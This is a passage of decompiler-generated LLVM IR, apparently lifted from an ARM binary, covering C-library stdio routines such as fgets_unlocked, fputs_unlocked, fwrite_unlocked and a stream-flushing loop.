  %v10_113a0 = icmp eq i8* %arg1, bitcast (i32** @global_var_23e14.616 to i8*)
  store i1 %v10_113a0, i1* %cpsr_z.global-to-local, align 1
  %.v1_113a4 = select i1 %v10_113a0, i32 0, i32 %tmp
  store i32 %.v1_113a4, i32* %r8.global-to-local, align 4
  %v2_113ac = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_113a0, label %bb, label %dec_label_pc_113b8

bb:                                               ; preds = %entry
  store i32 %.v1_113a4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_113c4

dec_label_pc_113b8:                               ; preds = %entry
  %v2_113b8 = icmp eq i32 %.v1_113a4, 0
  store i1 %v2_113b8, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_113b8, label %dec_label_pc_113c4, label %dec_label_pc_11510

dec_label_pc_113c4:                               ; preds = %bb, %dec_label_pc_113b8
  store i32 ptrtoint (i8* @global_var_13774.590 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_113ac, i32* @r0, align 4
  %v1_113d8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_23e30.594 to i32), i32* %r0.global-to-local, align 4
  %v1_113e8 = call i32 @__pthread_return_0()
  %v2_113f0 = load i32, i32* @global_var_28194.596, align 4
  %v1_113f4 = add i32 %v2_113f0, 1
  store i32 %v1_113f4, i32* %r3.global-to-local, align 4
  store i32 %v1_113f4, i32* @global_var_28194.596, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_113ac, i32* @r0, align 4
  %v1_1140c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_13774.590 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_113ac, i32* @r0, align 4
  %v1_11420 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_23e18.613 to i32), i32* %r0.global-to-local, align 4
  %v1_1142c = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_23e14.616 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_113ac, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1143c = load i32, i32* bitcast (i32** @global_var_23e14.616 to i32*), align 4
  store i32 %v2_1143c, i32* @r6, align 4
  %v1_11444 = call i32 @__pthread_return_void()
  store i32 %v1_11444, i32* %r0.global-to-local, align 4
  store i32 %v2_113ac, i32* @r4, align 4
  %v0_1144c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1144c, i32* @r5, align 4
  %v0_11500.pr = load i32, i32* @r6, align 4
  %v2_1150025 = icmp eq i32 %v0_11500.pr, 0
  store i1 %v2_1150025, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1150025, label %dec_label_pc_11508, label %dec_label_pc_11454

dec_label_pc_11454:                               ; preds = %dec_label_pc_113c4, %.thread11
  %v0_11470 = phi i32 [ %v3_114fc, %.thread11 ], [ %v0_11500.pr, %dec_label_pc_113c4 ]
  %v1_11454 = inttoptr i32 %v0_11470 to i8*
  %v2_11454 = load i8, i8* %v1_11454, align 1
  %v3_11454 = zext i8 %v2_11454 to i32
  store i32 %v3_11454, i32* %r3.global-to-local, align 4
  %v1_11458 = and i32 %v3_11454, 64
  %v2_11458 = icmp eq i32 %v1_11458, 0
  store i1 %v2_11458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11458, label %.thread11, label %dec_label_pc_11460

dec_label_pc_11460:                               ; preds = %dec_label_pc_11454
  %v2_11464 = load i32, i32* @global_var_23e48.607, align 4
  store i32 %v2_11464, i32* %r3.global-to-local, align 4
  %v7_11468 = icmp eq i32 %v2_11464, 2
  store i1 %v7_11468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11468, label %dec_label_pc_1149c, label %dec_label_pc_11470

dec_label_pc_11470:                               ; preds = %dec_label_pc_11460
  %v1_11470 = add i32 %v0_11470, 56
  store i32 %v1_11470, i32* @r4, align 4
  store i32 %v2_113ac, i32* @r0, align 4
  store i32 79740, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_13774.590 to i32), i32* %r1.global-to-local, align 4
  %v1_11488 = call i32 @__pthread_return_void()
  %v0_1148c = load i32, i32* @r4, align 4
  store i32 %v0_1148c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_13774.590 to i32), i32* %r3.global-to-local, align 4
  %v1_11498 = call i32 @__pthread_return_0()
  store i32 %v1_11498, i32* %r0.global-to-local, align 4
  %v0_1149c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1149c

dec_label_pc_1149c:                               ; preds = %dec_label_pc_11460, %dec_label_pc_11470
  %v0_114b0 = phi i32 [ %v0_11470, %dec_label_pc_11460 ], [ %v0_1149c.pre, %dec_label_pc_11470 ]
  %v1_1149c = inttoptr i32 %v0_114b0 to i32*
  %v2_1149c = load i32, i32* %v1_1149c, align 4
  %v0_114a0 = load i32, i32* %sl.global-to-local, align 4
  %v2_114a0 = or i32 %v0_114a0, %v2_1149c
  %v1_114a4 = xor i32 %v2_114a0, 320
  store i32 %v1_114a4, i32* %r3.global-to-local, align 4
  %v1_114a8 = and i32 %v1_114a4, 832
  %v2_114a8 = icmp eq i32 %v1_114a8, 0
  store i1 %v2_114a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114a8, label %dec_label_pc_114b0, label %bb39

dec_label_pc_114b0:                               ; preds = %dec_label_pc_1149c
  store i32 %v0_114b0, i32* @r0, align 4
  %v0_114b4 = call i32 @__stdio_wcommit()
  store i32 %v0_114b4, i32* %r0.global-to-local, align 4
  %v2_114b8 = icmp eq i32 %v0_114b4, 0
  store i1 %v2_114b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114b8, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_114b0
  %v1_114bc = load i32, i32* @r6, align 4
  %v2_114bc = inttoptr i32 %v1_114bc to i32*
  %v3_114bc = load i32, i32* %v2_114bc, align 4
  store i32 %v3_114bc, i32* %r3.global-to-local, align 4
  %v2_114c0 = add i32 %v1_114bc, 8
  %v3_114c0 = inttoptr i32 %v2_114c0 to i32*
  %v4_114c0 = load i32, i32* %v3_114c0, align 4
  %v2_114c4 = and i32 %v3_114bc, -65
  store i32 %v2_114c4, i32* %r3.global-to-local, align 4
  %v4_114c8 = sdiv i32 %v3_114bc, 256
  store i32 %v4_114c8, i32* %r1.global-to-local, align 4
  %v3_114cc = add i32 %v1_114bc, 28
  %v4_114cc = inttoptr i32 %v3_114cc to i32*
  store i32 %v4_114c0, i32* %v4_114cc, align 4
  %v1_114d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_114d0 = trunc i32 %v1_114d0 to i8
  %v3_114d0 = load i32, i32* @r6, align 4
  %v4_114d0 = add i32 %v3_114d0, 1
  %v5_114d0 = inttoptr i32 %v4_114d0 to i8*
  store i8 %v2_114d0, i8* %v5_114d0, align 1
  %v0_114d4.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_114d4.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_114d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_114d4 = trunc i32 %v1_114d4 to i8
  %v3_114d4 = load i32, i32* @r6, align 4
  %v4_114d4 = inttoptr i32 %v3_114d4 to i8*
  store i8 %v2_114d4, i8* %v4_114d4, align 1
  %v0_114d8.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_114d8.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_114b0, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_1149c, %.thread6, %.thread7
  %v2_114e0 = load i32, i32* @global_var_23e48.607, align 4
  store i32 %v2_114e0, i32* %r3.global-to-local, align 4
  %v7_114e4 = icmp eq i32 %v2_114e0, 2
  store i1 %v7_114e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114e4, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_113ac, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 79740, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 79740)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_11454, %bb40
  %v0_114fc = load i32, i32* @r6, align 4
  %v1_114fc = add i32 %v0_114fc, 32
  %v2_114fc = inttoptr i32 %v1_114fc to i32*
  %v3_114fc = load i32, i32* %v2_114fc, align 4
  store i32 %v3_114fc, i32* @r6, align 4
  %v2_11500 = icmp eq i32 %v3_114fc, 0
  store i1 %v2_11500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11500, label %dec_label_pc_11500.dec_label_pc_11508_crit_edge, label %dec_label_pc_11454

dec_label_pc_11500.dec_label_pc_11508_crit_edge:  ; preds = %.thread11
  %v0_11508.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11508

dec_label_pc_11508:                               ; preds = %dec_label_pc_11500.dec_label_pc_11508_crit_edge, %dec_label_pc_113c4
  %v0_11508 = phi i32 [ %v0_11508.pre, %dec_label_pc_11500.dec_label_pc_11508_crit_edge ], [ %v1_11444, %dec_label_pc_113c4 ]
  %v1_11508 = call i32 @_stdio_openlist_dec_use(i32 %v0_11508)
  store i32 %v1_11508, i32* %r0.global-to-local, align 4
  %v0_1154c.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_11510:                               ; preds = %dec_label_pc_113b8
  %v1_11510 = inttoptr i32 %.v1_113a4 to i8*
  %v2_11510 = load i8, i8* %v1_11510, align 1
  %v3_11510 = zext i8 %v2_11510 to i32
  %v1_11514 = and i32 %v3_11510, 64
  store i32 %v1_11514, i32* %r3.global-to-local, align 4
  %v2_11514 = icmp eq i32 %v1_11514, 0
  store i1 %v2_11514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11514, label %bb41, label %dec_label_pc_11520

bb41:                                             ; preds = %dec_label_pc_11510
  br label %bb43

dec_label_pc_11520:                               ; preds = %dec_label_pc_11510
  %v0_11520 = call i32 @__stdio_wcommit()
  store i32 %v0_11520, i32* %r0.global-to-local, align 4
  %v2_11524 = icmp eq i32 %v0_11520, 0
  store i1 %v2_11524, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11524, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_11520
  %v1_11528 = load i32, i32* %r8.global-to-local, align 4
  %v2_11528 = inttoptr i32 %v1_11528 to i32*
  %v3_11528 = load i32, i32* %v2_11528, align 4
  store i32 %v3_11528, i32* %r3.global-to-local, align 4
  %v2_1152c = add i32 %v1_11528, 8
  %v3_1152c = inttoptr i32 %v2_1152c to i32*
  %v4_1152c = load i32, i32* %v3_1152c, align 4
  store i32 %v4_1152c, i32* %r1.global-to-local, align 4
  %v2_11530 = and i32 %v3_11528, -65
  store i32 %v2_11530, i32* %r3.global-to-local, align 4
  %v4_11534 = sdiv i32 %v3_11528, 256
  %v2_11538 = trunc i32 %v4_11534 to i8
  %v4_11538 = add i32 %v1_11528, 1
  %v5_11538 = inttoptr i32 %v4_11538 to i8*
  store i8 %v2_11538, i8* %v5_11538, align 1
  %v0_1153c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1153c.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_1153c = load i32, i32* %r1.global-to-local, align 4
  %v2_1153c = load i32, i32* %r8.global-to-local, align 4
  %v3_1153c = add i32 %v2_1153c, 28
  %v4_1153c = inttoptr i32 %v3_1153c to i32*
  store i32 %v1_1153c, i32* %v4_1153c, align 4
  %v1_11540 = load i32, i32* %r3.global-to-local, align 4
  %v2_11540 = trunc i32 %v1_11540 to i8
  %v3_11540 = load i32, i32* %r8.global-to-local, align 4
  %v4_11540 = inttoptr i32 %v3_11540 to i8*
  store i8 %v2_11540, i8* %v4_11540, align 1
  %v0_11544.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11544.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_11520
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_11508, %.thread20
  %v0_1154c = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_1154c.pre, %dec_label_pc_11508 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_1154c, i32* %r0.global-to-local, align 4
  store i32 %v3_11398, i32* @r4, align 4
  ret i32 %v0_1154c

; uselistorder directives
  uselistorder i32 %v0_1154c, { 1, 0 }
  uselistorder i32 %v3_114fc, { 1, 2, 0 }
  uselistorder i32 %v2_113ac, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 9, 4, 10, 1, 6, 0, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 11, 0, 13, 14 }
  uselistorder i32* bitcast (i32** @global_var_23e14.616 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_28194.596, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1149c, { 1, 0 }
  uselistorder label %dec_label_pc_11454, { 1, 0 }
  uselistorder label %dec_label_pc_113c4, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11580 = icmp eq i32 %arg2, 0
  store i1 %v2_11580, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_11608, label %dec_label_pc_115ec.preheader

dec_label_pc_115ec.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_115ec15 = add i32 %arg2, -1
  store i32 %v1_115ec15, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_115ec21 = icmp eq i32 %arg2, 1
  store i1 %v7_115ec21, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115ec21, label %dec_label_pc_115f8, label %dec_label_pc_11598

dec_label_pc_11598:                               ; preds = %dec_label_pc_115ec.preheader, %dec_label_pc_115ec.backedge
  %v1_115f024.in = phi i32 [ %v0_115f0.pre, %dec_label_pc_115ec.backedge ], [ %arg3, %dec_label_pc_115ec.preheader ]
  %v1_11598 = add i32 %v1_115f024.in, 16
  %v2_11598 = inttoptr i32 %v1_11598 to i32*
  %v3_11598 = load i32, i32* %v2_11598, align 4
  store i32 %v3_11598, i32* %r2.global-to-local, align 4
  %v1_1159c = add i32 %v1_115f024.in, 24
  %v2_1159c = inttoptr i32 %v1_1159c to i32*
  %v3_1159c = load i32, i32* %v2_1159c, align 4
  %v3_115a0 = icmp uge i32 %v3_11598, %v3_1159c
  store i1 %v3_115a0, i1* %cpsr_c.global-to-local, align 1
  %v9_115a0 = icmp eq i32 %v3_11598, %v3_1159c
  store i1 %v9_115a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_115a0, label %dec_label_pc_115c0, label %dec_label_pc_115a8

dec_label_pc_115a8:                               ; preds = %dec_label_pc_11598
  %v1_115a8 = inttoptr i32 %v3_11598 to i8*
  %v2_115a8 = load i8, i8* %v1_115a8, align 1
  %v5_115a8 = add i32 %v3_11598, 1
  store i32 %v5_115a8, i32* %r2.global-to-local, align 4
  %v2_115ac = load i32, i32* @r4, align 4
  %v3_115ac = inttoptr i32 %v2_115ac to i8*
  store i8 %v2_115a8, i8* %v3_115ac, align 1
  %v0_115b0 = load i32, i32* @r4, align 4
  %v1_115b0 = inttoptr i32 %v0_115b0 to i8*
  %v2_115b0 = load i8, i8* %v1_115b0, align 1
  %v5_115b0 = add i32 %v0_115b0, 1
  store i32 %v5_115b0, i32* @r4, align 4
  %v2_115b4 = icmp ugt i8 %v2_115b0, 9
  store i1 %v2_115b4, i1* %cpsr_c.global-to-local, align 1
  %v7_115b4 = icmp eq i8 %v2_115b0, 10
  store i1 %v7_115b4, i1* %cpsr_z.global-to-local, align 1
  %v0_115b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_115b8 = load i32, i32* @r5, align 4
  %v2_115b8 = add i32 %v1_115b8, 16
  %v3_115b8 = inttoptr i32 %v2_115b8 to i32*
  store i32 %v0_115b8, i32* %v3_115b8, align 4
  br i1 %v7_115b4, label %dec_label_pc_115f8, label %dec_label_pc_115ec.backedge

dec_label_pc_115c0:                               ; preds = %dec_label_pc_11598
  %v1_115f024 = inttoptr i32 %v1_115f024.in to i8*
  %v3_115c0 = call i32 @getc_unlocked(i8* %v1_115f024)
  %v4_115c0 = trunc i32 %v3_115c0 to i8
  %v5_115c4 = icmp eq i8 %v4_115c0, -1
  store i1 %v5_115c4, i1* %cpsr_c.global-to-local, align 1
  %v10_115c4 = icmp eq i32 %v3_115c0, -1
  store i1 %v10_115c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_115c4, label %dec_label_pc_115cc, label %dec_label_pc_115e8

dec_label_pc_115cc:                               ; preds = %dec_label_pc_115c0
  %v0_115cc = load i32, i32* @r5, align 4
  %v1_115cc = inttoptr i32 %v0_115cc to i8*
  %v2_115cc = load i8, i8* %v1_115cc, align 1
  %v1_115d0 = and i8 %v2_115cc, 8
  %v2_115d0 = icmp eq i8 %v1_115d0, 0
  store i1 %v2_115d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_115d0, label %dec_label_pc_115f8, label %dec_label_pc_11608

dec_label_pc_115e8:                               ; preds = %dec_label_pc_115c0
  %v3_115dc = load i32, i32* @r4, align 4
  %v4_115dc = inttoptr i32 %v3_115dc to i8*
  store i8 %v4_115c0, i8* %v4_115dc, align 1
  %v0_115e0 = load i32, i32* @r4, align 4
  %v1_115e0 = inttoptr i32 %v0_115e0 to i8*
  %v2_115e0 = load i8, i8* %v1_115e0, align 1
  %v5_115e0 = add i32 %v0_115e0, 1
  store i32 %v5_115e0, i32* @r4, align 4
  %v2_115e4 = icmp ugt i8 %v2_115e0, 9
  store i1 %v2_115e4, i1* %cpsr_c.global-to-local, align 1
  %v7_115e4 = icmp eq i8 %v2_115e0, 10
  store i1 %v7_115e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115e4, label %dec_label_pc_115f8, label %dec_label_pc_115ec.backedge

dec_label_pc_115ec.backedge:                      ; preds = %dec_label_pc_115e8, %dec_label_pc_115a8
  %v0_115ec.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_115f0.pre = load i32, i32* @r5, align 4
  %v1_115ec = add i32 %v0_115ec.pre, -1
  store i32 %v1_115ec, i32* %r6.global-to-local, align 4
  %v2_115ec = icmp ne i32 %v0_115ec.pre, 0
  store i1 %v2_115ec, i1* %cpsr_c.global-to-local, align 1
  %v7_115ec = icmp eq i32 %v0_115ec.pre, 1
  store i1 %v7_115ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115ec, label %dec_label_pc_115f8, label %dec_label_pc_11598

dec_label_pc_115f8:                               ; preds = %dec_label_pc_115ec.preheader, %dec_label_pc_115e8, %dec_label_pc_115ec.backedge, %dec_label_pc_115a8, %dec_label_pc_115cc
  %v0_115f8 = load i32, i32* @r4, align 4
  %v1_115f8 = load i32, i32* %r7.global-to-local, align 4
  %v3_115f8 = icmp uge i32 %v0_115f8, %v1_115f8
  store i1 %v3_115f8, i1* %cpsr_c.global-to-local, align 1
  %v9_115f8 = icmp eq i32 %v0_115f8, %v1_115f8
  store i1 %v9_115f8, i1* %cpsr_z.global-to-local, align 1
  %v2_115fc = xor i1 %v9_115f8, true
  %v3_115fc = and i1 %v3_115f8, %v2_115fc
  br i1 %v3_115fc, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_115f8
  %v7_11600 = inttoptr i32 %v0_115f8 to i8*
  store i8 0, i8* %v7_11600, align 1
  %v0_11604.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_11604.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_115f8, %bb
  %v1_11604 = phi i1 [ %v1_11604.pre, %bb ], [ %v9_115f8, %dec_label_pc_115f8 ]
  %v0_11604 = phi i1 [ %v0_11604.pre, %bb ], [ %v3_115f8, %dec_label_pc_115f8 ]
  %v2_11604 = xor i1 %v1_11604, true
  %v3_11604 = and i1 %v0_11604, %v2_11604
  br i1 %v3_11604, label %.dec_label_pc_1160c_crit_edge, label %dec_label_pc_11608

.dec_label_pc_1160c_crit_edge:                    ; preds = %.thread7
  %v0_1160c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1160c

dec_label_pc_11608:                               ; preds = %entry, %dec_label_pc_115cc, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1160c

dec_label_pc_1160c:                               ; preds = %.dec_label_pc_1160c_crit_edge, %dec_label_pc_11608
  %v0_1160c = phi i32 [ %v0_1160c.pre, %.dec_label_pc_1160c_crit_edge ], [ 0, %dec_label_pc_11608 ]
  ret i32 %v0_1160c

; uselistorder directives
  uselistorder i1 %v9_115f8, { 1, 0, 2 }
  uselistorder i32 %v1_115f8, { 1, 0 }
  uselistorder i32 %v0_115f8, { 0, 2, 1 }
  uselistorder i32 %v0_115ec.pre, { 2, 0, 1 }
  uselistorder i1 %v2_115d0, { 1, 0 }
  uselistorder i32 %v3_11598, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_115f024.in, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i8 -1, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8 9, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1160c, { 1, 0 }
  uselistorder label %dec_label_pc_11608, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_115f8, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_11598, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_11614 = load i32, i32* @r4, align 4
  store i32 %v3_11614, i32* %stack_var_-16, align 4
  %v6_11614 = load i32, i32* @r5, align 4
  %v9_11614 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_11620 = call i32 @strlen(i8* %arg1)
  store i32 %v3_11620, i32* @r6, align 4
  %v0_11628 = load i32, i32* @r5, align 4
  %v0_1162c = load i32, i32* @r4, align 4
  %v5_11638 = inttoptr i32 %v0_11628 to i8*
  %v6_11638 = call i32 @__GI_fwrite_unlocked(i32 %v0_1162c, i32 1, i32 %v3_11620, i8* %v5_11638)
  %v1_1163c = load i32, i32* @r6, align 4
  %v9_1163c = icmp eq i32 %v6_11638, %v1_1163c
  br i1 %v9_1163c, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_11644 = phi i32 [ %v6_11638, %entry ], [ -1, %bb ]
  %v2_11644 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11644, i32* @r4, align 4
  store i32 %v6_11614, i32* @r5, align 4
  store i32 %v9_11614, i32* @r6, align 4
  ret i32 %v14_11644

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_11648 = load i32, i32* @r6, align 4
  %v12_11648 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_11650 = load i8, i8* %arg4, align 1
  %v4_11650 = zext i8 %v3_11650 to i32
  %v1_11654 = and i32 %v4_11650, 192
  store i32 %v1_11654, i32* %r3.global-to-local, align 4
  %v2_11658 = icmp eq i32 %v1_11654, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_11658, label %dec_label_pc_11680, label %dec_label_pc_11674

dec_label_pc_11674:                               ; preds = %entry
  %v4_11674 = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_11678 = icmp eq i32 %v4_11674, 0
  br i1 %v2_11678, label %dec_label_pc_11674.dec_label_pc_11680_crit_edge, label %dec_label_pc_116e8

dec_label_pc_11674.dec_label_pc_11680_crit_edge:  ; preds = %dec_label_pc_11674
  %v0_11680.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11680

dec_label_pc_11680:                               ; preds = %dec_label_pc_11674.dec_label_pc_11680_crit_edge, %entry
  %v0_116881 = phi i32 [ %v0_11680.pre, %dec_label_pc_11674.dec_label_pc_11680_crit_edge ], [ %arg2, %entry ]
  %v2_11680 = icmp eq i32 %v0_116881, 0
  br i1 %v2_11680, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11680
  br label %dec_label_pc_116e8

bb:                                               ; preds = %dec_label_pc_11680
  %v1_11684 = load i32, i32* @r6, align 4
  %v3_11684 = icmp eq i32 %v1_11684, 0
  br i1 %v3_11684, label %dec_label_pc_116e8, label %dec_label_pc_11694

dec_label_pc_11694:                               ; preds = %bb
  %v2_11694 = udiv i32 -1, %v0_116881
  %v0_1169c = load i32, i32* @r4, align 4
  store i32 %v0_1169c, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_11684, %v2_11694
  br i1 %tmp10, label %dec_label_pc_116c0, label %dec_label_pc_116a8

dec_label_pc_116a8:                               ; preds = %dec_label_pc_11694
  %v0_116a0 = load i32, i32* @r7, align 4
  %v2_116a8 = mul i32 %v1_11684, %v0_116881
  %v4_116ac = call i32 @__stdio_fwrite(i32 %v0_116a0, i32 %v2_116a8, i32 %v0_1169c)
  %v0_116b0 = load i32, i32* @r5, align 4
  %v2_116b4 = udiv i32 %v4_116ac, %v0_116b0
  store i32 %v2_116b4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_116ec

dec_label_pc_116c0:                               ; preds = %dec_label_pc_11694
  %v1_116c0 = inttoptr i32 %v0_1169c to i32*
  %v2_116c0 = load i32, i32* %v1_116c0, align 4
  %v1_116c4 = or i32 %v2_116c0, 8
  store i32 %v1_116c4, i32* %r3.global-to-local, align 4
  %v3_116c8 = sdiv i32 %v2_116c0, 256
  store i32 %v3_116c8, i32* %r2.global-to-local, align 4
  %v1_116cc = trunc i32 %v3_116c8 to i8
  %v3_116cc = add i32 %v0_1169c, 1
  %v4_116cc = inttoptr i32 %v3_116cc to i8*
  store i8 %v1_116cc, i8* %v4_116cc, align 1
  %v0_116d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_116d0 = trunc i32 %v0_116d0 to i8
  %v2_116d0 = load i32, i32* @r4, align 4
  %v3_116d0 = inttoptr i32 %v2_116d0 to i8*
  store i8 %v1_116d0, i8* %v3_116d0, align 1
  %v0_116d4 = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_116e0 = inttoptr i32 %v0_116d4 to i32*
  store i32 22, i32* %v2_116e0, align 4
  %v0_116ec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_116ec

dec_label_pc_116e8:                               ; preds = %.thread, %dec_label_pc_11674, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_116ec

dec_label_pc_116ec:                               ; preds = %dec_label_pc_116c0, %dec_label_pc_116a8, %dec_label_pc_116e8
  %v0_116ec = phi i32 [ %v0_116ec.pre, %dec_label_pc_116c0 ], [ %v2_116b4, %dec_label_pc_116a8 ], [ 0, %dec_label_pc_116e8 ]
  store i32 %v9_11648, i32* @r6, align 4
  store i32 %v12_11648, i32* @r7, align 4
  ret i32 %v0_116ec

; uselistorder directives
